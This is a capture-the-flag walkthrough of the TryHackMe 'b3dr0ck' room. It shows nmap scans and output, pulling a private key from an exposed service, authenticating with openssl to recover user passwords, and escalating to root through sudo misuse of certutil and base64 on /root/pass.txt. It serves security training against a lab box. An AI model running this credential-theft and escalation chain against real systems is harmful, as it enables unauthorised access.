# b3dr0ck from tryhackme
you can do that using the url

https://tryhackme.com/room/b3dr0ck

This room was awesome, as we get password for a user through gaining its ssl private certificate
and escalate from running 

as usual let's start with nmap scan,

## nmap scan
```bash
nmap -sC -sT -A <ip> -oA nmap
```
## nmap output
```bash
# Nmap 7.80 scan initiated Sat Aug 27 14:48:55 2022 as: nmap -sC -sT -A -oA nmap/bedrock 10.10.23.177
Nmap scan report for 10.10.23.177
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.23.177:4040/
9009/tcp open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9009-TCP:V=7.80%I=7%D=8/27%Time=6309E1AF%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 27 14:52:35 2022 -- 1 IP address (1 host up) scanned in 219.95 seconds

```
----------------------------------------------------------------------

we can see that there are 3 ports open, 
ssh on port 22
http on port 80 
and some wierd service on port 9009

so let's connect to that port
```bash
nc <port> 9009
```

the output comes like we should type something about key (public and private)

so let's type
```
private key
```
the output is
```
-----BEGIN RSA PRIVATE KEY-----
REDACTED
-----END RSA PRIVATE KEY-----

```
I have not shown the rsa key because , it is very important to try it out yourselves

and by typing public key
```
-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA4MjcwOTE4NDZaFw0yMzA4MjcwOTE4NDZaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDfZw9o
ujevd6SChINL8oJybftKWEcqlJv4K3mvlcYZvCQNSaZlhjfyIbSXK4BQ3PHImOs+
d30oznkk2AIBreUmFp9qwCf0WjCD48MAnmS9rSKmAiYkEPtilGHN3AFA+v7Ojwae
zEQ50AjVic+AGqzHi/O10LYzvZt1f+RPBnA7HA26IEa80xowQdc1g7X/b5r96PwP
fBBdq7VBs2rssARgv49GG6hwDO9TO6WBuFJMDqtRc0SSgOlB/5TYufuMRMIsMmOe
vJ7bgTTo1p7tU5xz2ewC9qAdszYmTHUbaxiR0/3Gx8gpSlCCoYV7KsIjJv4S29Lg
15lvV4sRk3zkORfFAgMBAAEwDQYJKoZIhvcNAQELBQADggEBALg9kplKGpZPdLOr
HYysL4OcLLBOMuPBOoHNlAWzQzU2ZyIaS91MSludJp16f7uVKcyaQ3qnkrXXs5sw
XURN26MXGe8OMHNpqudH3ioI12We1Rm6SeS3wYIfEdxEBNVbpN5Ir50RuZMpNxVW
41IoeQEgRhH/amQ9jHvyo0Hm2QEEymflI6+2mAq1uLJ45mqUhiggpHLUlNz5hZeq
Gr17ncSeKfXjNjAhHIquTgt3SS9wgBE6Zn4JfhoTF4UOUu7MWwcE1kwNSwSPiZSO
s1Gr3ZiEs86w53GVNrROMM+txTaD7U0/KoAnyd3KyJYxpImpqOx3OyRDaIKnznGS
SBFGy0A=
-----END CERTIFICATE-----
```
## let's save private and public key

copy this and save private key as private.key and public key as public.key

## running nmap all port scan
we get that port 54321 is running
```bash
# Nmap 7.80 scan initiated Sat Aug 27 15:40:46 2022 as: nmap -sC -sT -A -p 54321 -oN nmap/54321 10.10.23.177
Nmap scan report for 10.10.23.177
Host is up (0.27s latency).

PORT      STATE SERVICE     VERSION
54321/tcp open  ssl/unknown
| fingerprint-strings: 
|   RTSPRequest: 
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-08-27T09:18:28
|_Not valid after:  2023-08-27T09:18:28
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.80%T=SSL%I=7%D=8/27%Time=6309EDBD%P=x86_64-pc-linux-g
SF:nu%r(RTSPRequest,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x
SF:20for\x20access\.\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 27 15:41:39 2022 -- 1 IP address (1 host up) scanned in 53.05 seconds

```

## trying initial access
so let's connect to it by private key through openssl
(you could very well use socat, but I like using openssl)

```bash
openssl s_client -connect <ip>:54321 -cert public.key -key private.key 
```
we get something like a shell

it says that it is expecting something like login and password

typing password we got the user barney and pass d1ad<redacted>0dd
	once again I will not give you password :) try it out yourselves
## ssh into barney
```bash
ssh barney@<ip>
```
ssh into it and we got a shell

running linpeas is worthwhile but I use my own enumeration techniques before running scripts

I checked,
```bash
sudo -l 
```

we got that barney user can run /usr/bin/certutil (I think this is a binary that was created by creator)

running that we get the help page saying that we can run 'ls' and 'user user' as an arguments

it was a java file you can cat it out if you want

```bash
sudo /usr/bin/certutil ls
```
we get the ls -la command on some directory

what I am interested is to get to fred user
so, type with me

## switching to fred user
```bash
sudo /usr/bin/certutil fred fred
```

It creates a private and public key

copy that and save as pri.key and pub.key

repeat the process that we did for barney

## getting fred's password
```bash
openssl s_client -connect <ip>:54321 -cert pub.key -key priv.key 
```

type password

you will get
```
Yab<redacted>0000!
```
## getting into fred
ssh to the box as fred
```bash
ssh fred@<ip>
```
put in the password (sorry paste it, I know you can't type)

and we are fred

running 
```bash
sudo -l
```
## Privilege escalation
we get we can run /usr/bin/base64 or base32 on /root/pass.txt

so let's run that with base64
```
TEZLRUM[REDACTED]YVVJUTEpaS0ZTU1lL
```

## decrypting with cyberchef
If you dont know the type of encoding

use "magic" from cyberchef and paste the text

we get something like that hash

using crackstation we can see that password is
flint<redacted>vitamins 

## switching to root
```bash
su root
```

you can type the password

and get root.txt
